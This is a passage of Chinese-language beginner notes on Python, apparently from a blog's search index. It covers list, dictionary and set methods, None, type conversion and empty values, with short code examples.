<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;你好&#x27;</span>,<span class="string">&#x27;old&#x27;</span>,<span class="string">&#x27;boy&#x27;</span>]</span><br><span class="line">a.insert(<span class="number">1</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[&#x27;你好&#x27;, &#x27;666&#x27;, &#x27;old&#x27;, &#x27;boy&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>排序</p>
<ul>
<li>sort():不加参数默认是从小到大</li>
<li>sort(reverse=’True’)：则代表从大到小</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#从小到大排序</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line">a.sort()</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[1, 22, 55, 66]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#从大到小排序</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line">a.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[66, 55, 22, 1]</span></span><br></pre></td></tr></table></figure>



<p>反转</p>
<ul>
<li><p>reverse</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line">a.reverse()</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[22, 55, 66, 1]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>查找数据出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line">b = a.count(<span class="number">55</span>)</span><br><span class="line"><span class="built_in">print</span>(b)    <span class="comment">#结果为：2</span></span><br></pre></td></tr></table></figure>





<p>索引：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">3</span>])    <span class="comment">#结果为：22</span></span><br></pre></td></tr></table></figure>

<p>切片：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例1：</span></span><br><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])    <span class="comment">#结果为：[66, 55]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例2：</span></span><br><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a[:])    <span class="comment">#结果为：[55, 66, 55, 22]</span></span><br></pre></td></tr></table></figure>

<p>步长：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a[::<span class="number">2</span>])    <span class="comment">#结果为：[55, 55]</span></span><br></pre></td></tr></table></figure>

<p>长度：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))    <span class="comment">#结果为：4</span></span><br></pre></td></tr></table></figure>

<p>以特定字符连接元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;你好&#x27;</span>,<span class="string">&#x27;old&#x27;</span>,<span class="string">&#x27;boy&#x27;</span>]</span><br><span class="line">a = <span class="string">&#x27;-&#x27;</span>.join(a)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：你好-old-boy</span></span><br></pre></td></tr></table></figure>















<h2 id="6、字典"><a href="#6、字典" class="headerlink" title="6、字典"></a>6、字典</h2><p>获取所有的键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.keys())    <span class="comment">#结果为：dict_keys([&#x27;name&#x27;, &#x27;age&#x27;, &#x27;sex&#x27;])</span></span><br></pre></td></tr></table></figure>

<p>获取所有的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.values())    <span class="comment">#结果为：dict_values([&#x27;张三&#x27;, 26, &#x27;男&#x27;])</span></span><br></pre></td></tr></table></figure>

<p>获取所有的键值对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.items())    <span class="comment">#结果为：dict_items([(&#x27;name&#x27;, &#x27;张三&#x27;), (&#x27;age&#x27;, 26), (&#x27;sex&#x27;, &#x27;男&#x27;)])</span></span><br></pre></td></tr></table></figure>

<p>增加</p>
<ul>
<li>通过键来增加</li>
<li>通过update来增加</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过键来增加</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a[<span class="string">&#x27;fun&#x27;</span>] = <span class="string">&#x27;篮球&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 26, &#x27;sex&#x27;: &#x27;男&#x27;, &#x27;fun&#x27;: &#x27;篮球&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过update增加</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;fun&#x27;</span>:<span class="string">&#x27;篮球&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 26, &#x27;sex&#x27;: &#x27;男&#x27;, &#x27;fun&#x27;: &#x27;篮球&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>修改</p>
<ul>
<li><p>通过索引修改</p>
</li>
<li><p>通过update修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过键来修改</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;李四&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;李四&#x27;, &#x27;age&#x27;: 26, &#x27;sex&#x27;: &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过update修改</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;李四&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;李四&#x27;, &#x27;age&#x27;: 26, &#x27;sex&#x27;: &#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>删除</p>
<ul>
<li><p>通过del删除</p>
</li>
<li><p>通过pop删除</p>
</li>
<li><p>通过clear清空</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过del删除</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;sex&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 26&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过pop删除</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.pop(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#x27;age&#x27;: 26, &#x27;sex&#x27;: &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过clear清空</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.clear()</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：&#123;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看</p>
<ul>
<li><p>索引查看:注意索引使用的是中括号，如果不存在，则报错</p>
</li>
<li><p>get查看：如果不存在默认返回None，也可以指定返回内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1、键存在</span></span><br><span class="line"><span class="comment">#索引查看</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;name&#x27;</span>])    <span class="comment">#结果为：张三</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get查看</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.get(<span class="string">&#x27;name&#x27;</span>))    <span class="comment">#结果为：张三</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2、键不存在</span></span><br><span class="line"><span class="comment">#索引查看：不存在则报错</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;money&#x27;</span>])    <span class="comment">#报错：KeyError: &#x27;money&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#get查看：不存在则默认返回None</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.get(<span class="string">&#x27;money&#x27;</span>))    <span class="comment">#结果为：None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get查看：不存在可以指定返回内容</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.get(<span class="string">&#x27;money&#x27;</span>,<span class="string">&#x27;键不存在&#x27;</span>))    <span class="comment">#结果为：键不存在</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>for循环</p>
<ul>
<li><p>for + 字典  得到的只是键而已</p>
</li>
<li><p>for + 字典.values()  ：得到的才是值</p>
</li>
<li><p>for + 字典.items()  ：得到的才是键值对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#for + 字典  得到的只是键而已</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果：name</span></span><br><span class="line"><span class="string">age</span></span><br><span class="line"><span class="string">sex</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#for + 字典.values()  ：得到的才是值</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.values():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果：</span></span><br><span class="line"><span class="string">张三</span></span><br><span class="line"><span class="string">26</span></span><br><span class="line"><span class="string">男</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for + 字典.items()  ：得到的才是键值对</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">26</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> a.items():</span><br><span class="line">    <span class="built_in">print</span>(k,v)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果：</span></span><br><span class="line"><span class="string">name 张三</span></span><br><span class="line"><span class="string">age 26</span></span><br><span class="line"><span class="string">sex 男</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="7、集合"><a href="#7、集合" class="headerlink" title="7、集合"></a>7、集合</h2><p>新增</p>
<ul>
<li>特性：如果集合理由相同内容，则不新增</li>
<li>当个元素新增：add</li>
<li>批量新增：update,接收参数为序列，可以将接收参数的每一个元素添加到集合中</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#add添加</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.add(<span class="string">&#x27;狗屎&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;&#x27;张三&#x27;, &#x27;狗屎&#x27;, 26, &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#update添加</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.update([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;1, 2, &#x27;张三&#x27;, &#x27;男&#x27;, 26&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>删除</p>
<ul>
<li><p>remove:直接删除指定的值，如果不存在，则报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除的值存在</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.remove(<span class="number">26</span>)</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;&#x27;张三&#x27;, &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除的值不存在：报错</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.remove(<span class="number">33</span>)</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：KeyError: 33</span></span><br></pre></td></tr></table></figure></li>
<li><p>discard：直接删除指定的值，不管删除的值存不存在都不报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除的值存在</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.discard(<span class="number">26</span>)</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;&#x27;张三&#x27;, &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除的值不存在：不报错</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.discard(<span class="number">66</span>)</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;&#x27;张三&#x27;, 26, &#x27;男&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>随机删除：pop</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">a.pop()</span><br><span class="line"><span class="built_in">print</span>(a)        <span class="comment"># 结果：&#123;26, &#x27;张三&#x27;&#125;</span></span><br></pre></td></tr></table></figure>



<p>交集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;李四&#x27;</span>,<span class="number">36</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">same = a.intersection(b)</span><br><span class="line"><span class="built_in">print</span>(same)        <span class="comment"># 结果：&#123;&#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>并集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;李四&#x27;</span>,<span class="number">36</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">same = a.union(b)</span><br><span class="line"><span class="built_in">print</span>(same)        <span class="comment"># 结果：&#123;36, &#x27;张三&#x27;, &#x27;男&#x27;, &#x27;李四&#x27;, 26&#125;</span></span><br></pre></td></tr></table></figure>

<p>差集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a相对于b的差集：提取元素（在b里所没有的a的元素）</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;李四&#x27;</span>,<span class="number">36</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">difference = a.difference(b)</span><br><span class="line"><span class="built_in">print</span>(difference)        <span class="comment"># 结果：&#123;26, &#x27;张三&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b相对于a的差集：提取元素（在a里所没有的b的元素）</span></span><br><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;李四&#x27;</span>,<span class="number">36</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">difference = b.difference(a)</span><br><span class="line"><span class="built_in">print</span>(difference)        <span class="comment"># 结果：&#123;36, &#x27;李四&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="8、None"><a href="#8、None" class="headerlink" title="8、None"></a>8、None</h2><p>作用：占坑</p>
<p>特性：不带任何属性</p>
<h2 id="9、数据类型的转换"><a href="#9、数据类型的转换" class="headerlink" title="9、数据类型的转换"></a>9、数据类型的转换</h2><p>其他类型转布尔型：</p>
<ul>
<li>int里只有0是False，其余全部是True</li>
<li>str里只有空’’是False，其余全部是True</li>
<li>元组里只有空元组()是False，其余全部是True</li>
<li>列表里只有空列表[]是False，其余全部是True</li>
<li>字典里只有空字典{}是False，其余全部是True</li>
<li>集合里只有空集合set()是False，其余全部是True</li>
<li>None本身就是Flase</li>
</ul>
<p>布尔类型转整型：</p>
<ul>
<li>True可以转换为1</li>
<li>False可以转换为0</li>
</ul>
<p>整型int和字符串str互转</p>
<ul>
<li>整型转str：str(6)</li>
<li>str转整型：int(‘10’)     此处需要注意，必须要类似于数字的字符才能转整型，否则容易报错</li>
</ul>
<p>元组、列表、结合互转</p>
<ul>
<li><p>本质：相当于for循环待转换序列的每一个元素，然后将其添加到需要转换的序列</p>
</li>
<li><p>元组转列表、集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))        <span class="comment"># 元组转列表，结果：[3, 4, 5]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))        <span class="comment"># 元组转集合，结果：&#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>列表转元组、集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(a))        <span class="comment"># 列表转元组，结果：(3, 4, 5)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))        <span class="comment"># 列表转集合，结果：&#123;3, 4, 5&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p>集合转元组、列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(a))        <span class="comment"># 结合转元组，结果：(26, &#x27;男&#x27;, &#x27;张三&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))        <span class="comment"># 集合转列表，结果：[26, &#x27;男&#x27;, &#x27;张三&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>特殊情况</p>
<ul>
<li>因为字典的结构特殊，所以其他数据类型无法转换成字典<ul>
<li>原因：因为序列转换的本质就是for循环，但是for循环字典得到的只是键，所以转换字典得到的只是键</li>
</ul>
</li>
<li>因为字典的结构特殊，所以字典转化为其他类型，转换的只是键，而没有值<ul>
<li>原因：因为序列转换的本质就是for循环，但是for循环字典得到的只是键，所以转换字典得到的只是键</li>
</ul>
</li>
<li>序列转化为str，结果还是一样，转没转都是一样</li>
</ul>
</li>
</ul>
<h2 id="10、空数据类型的设置"><a href="#10、空数据类型的设置" class="headerlink" title="10、空数据类型的设置"></a>10、空数据类型的设置</h2><p>两种设置方法：</p>
<ul>
<li><p>字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a = <span class="built_in">str</span>()</span><br></pre></td></tr></table></figure></li>
<li><p>元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = ()</span><br><span class="line">a = <span class="built_in">tuple</span>()</span><br></pre></td></tr></table></figure></li>
<li><p>列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">a = <span class="built_in">list</span>()</span><br></pre></td></tr></table></figure></li>
<li><p>字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">a = <span class="built_in">dict</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>一种设置方法：</p>
<ul>
<li><p>整型只有一种设置方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>()</span><br></pre></td></tr></table></figure></li>
<li><p>布尔型只有一种设置方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="literal">False</span>   <span class="comment">#这就是相当于布尔类型的空了</span></span><br></pre></td></tr></table></figure></li>
<li><p>集合只有一种设置方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">set</span>()</span><br></pre></td></tr></table></figure></li>
<li><p>None只有一种设置方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="literal">None</span>  <span class="comment">#本身就相当于空</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="11、-数据类型方法的返回值"><a href="#11、-数据类型方法的返回值" class="headerlink" title="11、 数据类型方法的返回值"></a>11、 数据类型方法的返回值</h2><p>通用判别方法：</p>
<ul>
<li><p>str、tuple，dict一般情况下都是有返回值的</p>
<p>特殊情况：del()，clear()     这些没有返回值</p>
</li>
<li><p>可变类型list，set一般都没有返回值</p>
<p>特殊情况：pop()、intersection()，difference()，union()  这些有返回值</p>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
</search>
